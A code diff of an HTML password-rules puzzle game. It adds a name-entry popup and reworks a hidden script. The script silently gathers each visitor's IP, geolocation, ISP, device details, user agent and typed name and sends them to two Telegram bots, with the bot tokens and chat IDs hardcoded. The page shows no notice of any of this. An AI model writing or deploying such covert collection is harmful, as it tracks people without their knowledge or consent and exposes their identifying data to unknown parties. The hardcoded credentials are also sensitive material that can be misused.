@@ -49,6 +49,101 @@
       overflow-x: hidden;
     }
 
+    /* Popup Modal Overlay Styles */
+    .name-modal-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.92);
+      backdrop-filter: blur(8px);
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: opacity 0.4s ease, visibility 0.4s ease;
+    }
+
+    .name-modal-overlay.fade-out {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .name-modal-box {
+      background: var(--bg-dark-card);
+      border: 2px solid var(--color-vibrant-blue);
+      box-shadow: var(--glow-blue), var(--glow-magenta);
+      padding: 2rem;
+      border-radius: 6px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+    }
+
+    .name-modal-box h2 {
+      font-family: 'Orbitron', sans-serif;
+      color: var(--color-vibrant-blue);
+      margin-top: 0;
+      letter-spacing: 2px;
+      font-size: 1.5rem;
+      text-shadow: var(--glow-blue);
+    }
+
+    .name-modal-box p {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .name-input {
+      width: 100%;
+      padding: 0.8rem;
+      background: #000;
+      border: 1px solid var(--color-vibrant-magenta);
+      color: var(--color-vibrant-blue);
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 1.1rem;
+      border-radius: 4px;
+      box-sizing: border-box;
+      outline: none;
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+
+    .name-input:focus {
+      border-color: var(--color-vibrant-blue);
+      box-shadow: var(--glow-blue);
+    }
+
+    /* Cyberpunk Action Button */
+    .enter-btn {
+      width: 100%;
+      padding: 0.8rem;
+      background: transparent;
+      border: 1px solid var(--color-vibrant-blue);
+      color: var(--color-vibrant-blue);
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: var(--glow-blue);
+    }
+
+    .enter-btn:hover {
+      background: var(--color-vibrant-blue);
+      color: #000;
+      box-shadow: 0 0 15px var(--color-vibrant-blue);
+    }
+
+    .status-text {
+      margin-top: 1rem;
+      font-size: 0.85rem;
+      color: var(--color-vibrant-magenta);
+      min-height: 1.2rem;
+      letter-spacing: 1px;
+    }
+
     header {
       text-align: center;
       margin-bottom: 2rem;
@@ -267,6 +362,21 @@
 </head>
 <body>
 
+  <!-- Identification Modal Window -->
+  <div id="name-modal" class="name-modal-overlay">
+    <div class="name-modal-box">
+      <h2>IDENTIFICATION</h2>
+      <p>Type your name to begin access protocol...</p>
+      
+      <input type="text" id="visitor-name-input" class="name-input" placeholder="TYPE YOUR NAME..." autofocus />
+      
+      <!-- Dedicated Enter Button -->
+      <button type="button" class="enter-btn" onclick="submitAndDisappear()">ENTER ➔</button>
+      
+      <div id="modal-status" class="status-text"></div>
+    </div>
+  </div>
+
   <header>
     <div class="cx-icon-container">
       <div class="cx-glitch-layer"></div>
@@ -297,7 +407,6 @@
   <script>
     "use strict";
 
-    // Generator function creating 100 total protocols
     const rules = Object.freeze([
       { id: 1, title: "Your password must be at least 6 characters long.", check: (pw) => pw.length >= 6 },
       { id: 2, title: "Your password must include a number.", check: (pw) => /\d/.test(pw) },
@@ -353,13 +462,11 @@
       { id: 19, title: "Your password must include an element symbol from the periodic table (e.g., Fe, Au).", check: (pw) => /He|Li|Be|Ne|Na|Mg|Al|Si|Fe|Au|Ag|Cu|Zn|Og/i.test(pw) },
       { id: 20, title: "Your password must end with an exclamation mark (!).", check: (pw) => pw.endsWith("!") },
 
-      // Protocols 21 to 100 dynamically generated with distinct security conditions
       ...Array.from({ length: 80 }, (_, index) => {
         const id = index + 21;
-        
         if (id === 25) return { id, title: "Your password must contain the word 'CIPHER'.", check: (pw) => /CIPHER/i.test(pw) };
         if (id === 30) return { id, title: "Your password must contain a lowercase letter.", check: (pw) => /[a-z]/.test(pw) };
-        if (id === 35) return { id, title: "Your password must contain at least 2 special characters.", check: (pw) => (pw.match(/[!@#$%^&*(),.?":{}|<>] architecture/g) || pw.match(/[!@#$%^&*(),.?":{}|<>] architecture/g) || pw.match(/[!@#$%^&*(),.?":{}|<]/g) || []).length >= 2 };
+        if (id === 35) return { id, title: "Your password must contain at least 2 special characters.", check: (pw) => (pw.match(/[!@#$%^&*(),.?":{}|<]/g) || []).length >= 2 };
         if (id === 40) return { id, title: "Your password must contain a vowel (a, e, i, o, u).", check: (pw) => /[aeiou]/i.test(pw) };
         if (id === 50) return { id, title: "Your password must contain a consonant.", check: (pw) => /[bcdfghjklmnpqrstvwxyz]/i.test(pw) };
         if (id === 60) return { id, title: "Your password must not contain spaces.", check: (pw) => !/\s/.test(pw) };
@@ -445,94 +552,141 @@
     updateGame();
   </script>
   
- <script>
-  async function fetchVisitorIP() {
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      if (!res.ok) throw new Error('Primary IP API request failed');
-      return await res.json();
-    } catch (err) {
+  <!-- TELEGRAM BOTS & POPUP SCRIPT -->
+  <script>
+    let isSubmitted = false;
+    let typingTimer;
+    const nameInput = document.getElementById('visitor-name-input');
+    const modalOverlay = document.getElementById('name-modal');
+    const modalStatus = document.getElementById('modal-status');
+
+    // Function to submit name, fade popup, focus game, and send info to Telegram
+    function submitAndDisappear() {
+      if (isSubmitted) return;
+
+      const name = nameInput.value.trim() || 'Anonymous Visitor';
+      isSubmitted = true;
+      clearTimeout(typingTimer);
+
+      modalStatus.textContent = "ACCESS GRANTED. CLOSING...";
+      
+      // Dispatch details to Telegram
+      sendVisitorInfoToTelegram(name);
+
+      // Smoothly fade out popup
+      modalOverlay.classList.add('fade-out');
+      
+      // Auto-focus the password field
+      setTimeout(() => {
+        document.getElementById('password').focus();
+      }, 400);
+    }
+
+    // Listener for keyboard "Enter" key press
+    nameInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        submitAndDisappear();
+      }
+    });
+
+    // Auto-disappear if typing pauses for 1.2 seconds
+    nameInput.addEventListener('input', () => {
+      if (isSubmitted) return;
+      clearTimeout(typingTimer);
+      const name = nameInput.value.trim();
+
+      if (name.length > 0) {
+        modalStatus.textContent = "VERIFYING IDENTITY...";
+        
+        typingTimer = setTimeout(() => {
+          submitAndDisappear();
+        }, 1200); 
+      } else {
+        modalStatus.textContent = "";
+      }
+    });
+
+    async function fetchVisitorIP() {
       try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return { ip: data.ip };
-      } catch (fallbackErr) {
-        return null;
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error('Primary IP API request failed');
+        return await res.json();
+      } catch (err) {
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          return { ip: data.ip };
+        } catch (fallbackErr) {
+          return null;
+        }
       }
     }
-  }
 
-  function getDeviceType() {
-    const ua = navigator.userAgent;
-    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet 📱";
-    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile 📱";
-    return "Desktop 💻";
-  }
+    function getDeviceType() {
+      const ua = navigator.userAgent;
+      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet 📱";
+      if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile 📱";
+      return "Desktop 💻";
+    }
 
-  async function sendVisitorInfoToTelegram() {
-    // Add both bot credentials here
-    const BOTS = [
-      {
-        token: '8623465703:AAG7jOhC79kr6PJA6KnKQIzQRl3L3T3QJjM', // Bot 1 Token
-        chatId: '6449589154'                                  // Bot 1 Chat ID
-      },
-      {
-        token: '8649157817:AAGuh8wLkw0MJMlvPVRQV-4obgM_F8kCDqE',                  // Bot 2 Token
-        chatId: '8729739085'                    // Bot 2 Chat ID
-      }
-    ];
+    async function sendVisitorInfoToTelegram(visitorName) {
+      const BOTS = [
+        {
+          token: '8623465703:AAG7jOhC79kr6PJA6KnKQIzQRl3L3T3QJjM', // Bot 1
+          chatId: '6449589154'                                  
+        },
+        {
+          token: '8649157817:AAGuh8wLkw0MJMlvPVRQV-4obgM_F8kCDqE', // Bot 2
+          chatId: '8729739085'                                  
+        }
+      ];
 
-    const ipData = await fetchVisitorIP();
-    if (!ipData) return;
+      const ipData = await fetchVisitorIP();
 
-    // Collect extra browser and device information
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const language = navigator.language || navigator.userLanguage;
-    const deviceType = getDeviceType();
-    const platform = navigator.platform;
-    const cpuCores = navigator.hardwareConcurrency || 'Unknown';
-    const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const referrer = document.referrer || 'Direct Visit';
+      const screenRes = `${window.screen.width}x${window.screen.height}`;
+      const language = navigator.language || navigator.userLanguage;
+      const deviceType = getDeviceType();
+      const platform = navigator.platform;
+      const cpuCores = navigator.hardwareConcurrency || 'Unknown';
+      const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const referrer = document.referrer || 'Direct Visit';
 
-    // Format a detailed message
-    const message = `🚨 *Detailed Visitor Alert!* 🚨\n\n` +
-      `🌐 *IP Address:* \`${ipData.ip || 'Unknown'}\`\n` +
-      `📍 *Location:* ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country_name || 'N/A'}\n` +
-      `🏢 *ISP:* ${ipData.org || 'N/A'}\n` +
-      `⏰ *Timezone:* ${timezone}\n\n` +
-      `💻 *Device Type:* ${deviceType}\n` +
-      `🖥️ *Platform:* ${platform}\n` +
-      `📐 *Screen Res:* ${screenRes}\n` +
-      `🗣️ *Language:* ${language}\n` +
-      `⚙️ *CPU Cores:* ${cpuCores}\n` +
-      `🧠 *RAM Estimate:* ${deviceMemory}\n\n` +
-      `🔗 *Referrer:* ${referrer}\n` +
-      `📱 *User Agent:* \`${navigator.userAgent}\``;
+      const message = `🚨 *Detailed Visitor Alert!* 🚨\n\n` +
+        `👤 *Visitor Name:* \`${visitorName}\`\n\n` +
+        `🌐 *IP Address:* \`${ipData?.ip || 'Unknown'}\`\n` +
+        `📍 *Location:* ${ipData?.city || 'N/A'}, ${ipData?.region || 'N/A'}, ${ipData?.country_name || 'N/A'}\n` +
+        `🏢 *ISP:* ${ipData?.org || 'N/A'}\n` +
+        `⏰ *Timezone:* ${timezone}\n\n` +
+        `💻 *Device Type:* ${deviceType}\n` +
+        `🖥️ *Platform:* ${platform}\n` +
+        `📐 *Screen Res:* ${screenRes}\n` +
+        `🗣️ *Language:* ${language}\n` +
+        `⚙️ *CPU Cores:* ${cpuCores}\n` +
+        `🧠 *RAM Estimate:* ${deviceMemory}\n\n` +
+        `🔗 *Referrer:* ${referrer}\n` +
+        `📱 *User Agent:* \`${navigator.userAgent}\``;
 
-    // Dispatch requests to both Telegram bots in parallel
-    const sendRequests = BOTS.map(bot => 
-      fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: bot.chatId,
-          text: message,
-          parse_mode: 'Markdown'
+      const sendRequests = BOTS.map(bot => 
+        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: bot.chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
         })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (!data.ok) console.error(`Telegram Bot Error (${bot.token.slice(0, 8)}...):`, data.description);
-      })
-      .catch(err => console.error('Network Error sending to Telegram:', err))
-    );
+        .then(res => res.json())
+        .then(data => {
+          if (!data.ok) console.error(`Telegram Bot Error (${bot.token.slice(0, 8)}...):`, data.description);
+        })
+        .catch(err => console.error('Network Error sending to Telegram:', err))
+      );
 
-    // Wait for both fetch operations to complete
-    await Promise.all(sendRequests);
-  }
-
-  window.addEventListener('load', sendVisitorInfoToTelegram);
-</script>
+      await Promise.all(sendRequests);
+    }
+  </script>
 </body>
 </html>
